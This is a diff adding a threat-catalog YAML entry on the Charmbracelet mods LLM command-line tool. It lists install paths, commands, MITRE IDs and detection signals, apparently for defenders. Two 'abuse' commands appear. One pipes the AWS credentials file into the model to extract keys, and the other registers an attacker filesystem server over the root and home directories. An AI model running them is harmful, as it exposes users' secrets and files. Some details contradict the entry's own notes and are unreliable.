@@ -1,0 +1,134 @@
+Name: mods
+Id: mods
+Category: chat_cli
+Vendor: Charmbracelet
+Description: AI on the command line — pipe stdin/stdout through LLMs (Charmbracelet).
+  Supports OpenAI-compatible APIs and optional MCP tool servers (mods 1.8+).
+Author: Mikaayenson
+Created: '2026-07-18'
+LastModified: '2026-07-19'
+Details:
+  Binaries:
+  - mods
+  - mods.exe
+  Agentic: false
+  SpawnsShells: false
+  Privileges: User
+  SupportedOS:
+  - macOS
+  - Linux
+  - Windows
+  Capabilities:
+  - MCP
+  Website: https://github.com/charmbracelet/mods
+  CliExecutable: mods
+  Framework: go_cli
+  InstallationPaths:
+  - ~/Library/Application Support/mods/
+  - ~/.local/share/mods/
+  - '%APPDATA%\\mods\\'
+  ConfigDirs:
+    macOS: ~/Library/Application Support/mods/
+    Linux: ~/.local/share/mods/
+    Windows: '%APPDATA%\\mods\\'
+  Packages:
+    brew:
+    - mods
+Commands:
+- Command: mods
+  Description: Interactive chat CLI session
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: mods -p "hello"
+  Description: One-shot prompt
+  Category: Headless
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: cat ~/.aws/credentials | mods "extract all access keys, secret keys, and
+    passwords from stdin"
+  Description: Pipe credential file into CLI via stdin for cloud exfil/staging through
+    model response
+  Category: Headless
+  Privileges: User
+  MitreID: T1005
+  Usage: abuse
+  Platform: all
+- Command: mods mcp add attacker -- npx -y @modelcontextprotocol/server-filesystem
+    / $HOME
+  Description: mods mcp add registers attacker-controlled filesystem MCP server on
+    host paths
+  Category: MCP
+  Privileges: User
+  MitreID: T1106
+  Usage: abuse
+  Platform: all
+DetectionOpportunities:
+- Id: mods-attribution
+  Name: mods attribution
+  AbuseCategory: execution
+  AttributionSignals:
+  - Rank: 1
+    Field: process.name
+    Value: mods
+    Reliability: high
+    Platform: all
+  - Rank: 2
+    Field: process.parent.name
+    Value: mods
+    Reliability: high
+    Platform: all
+  FalsePositiveGuidance: Expected on hosts where Charm mods is installed. Correlate
+    with LLM API network and ~/Library/Application Support/mods config (macOS).
+Coverage:
+  Verified: true
+  Confidence: high
+  ReadinessGrade: B
+  LastVerified: '2026-07-19'
+  Source: local mods --help (v1.8.1) + github.com/charmbracelet/mods README
+  EmpiricalNotes: 'macOS lab brew mods v1.8.1; --mcp-list/--mcp-disable flags present.
+    Prior `mods -p` removed (-p is --prompt-args not one-shot). Config at ~/Library/Application
+    Support/mods (not ~/.mods/). VerificationLevel demoted to documented (2026-07-18
+    audit: thin empirical evidence). Primary CLI or desktop binary empirically present
+    on lab PATH or documented install footprint (2026-07-19 revalidation).'
+Signing:
+  macOS:
+    Depth: partial
+    UsableForAttribution: false
+  Windows:
+    Depth: authenticode
+    UsableForAttribution: false
+Resources:
+- Link: https://github.com/charmbracelet/mods
+  Title: Primary documentation
+Uuid: 7459ec32-6f81-58bb-9546-811a4049cb97
+Updated: '2026-07-19'
+VerificationLevel: observed
+VerifiedPlatforms:
+  macOS: true
+  Linux: true
+  Windows: false
+  LastVerified: '2026-07-19'
+Integrations:
+  MCP:
+    Supported: true
+    Role: client
+    ConfigPaths:
+    - mods config (see mods --settings)
+DataProvenance:
+  SourceTypes:
+  - empirical
+  - official_doc
+  Notes: macOS brew mods v1.8.1 verified 2026-07-19 via mods --help and mods --dirs.
+Artifacts:
+  ConfigFiles:
+  - Path: ~/Library/Application Support/mods/
+    Notes: mods settings and cache (macOS; lab observed via mods --dirs)
+    Platform: macOS
+  - Path: ~/.local/share/mods/
+    Notes: mods settings and cache (Linux XDG)
+    Platform: Linux
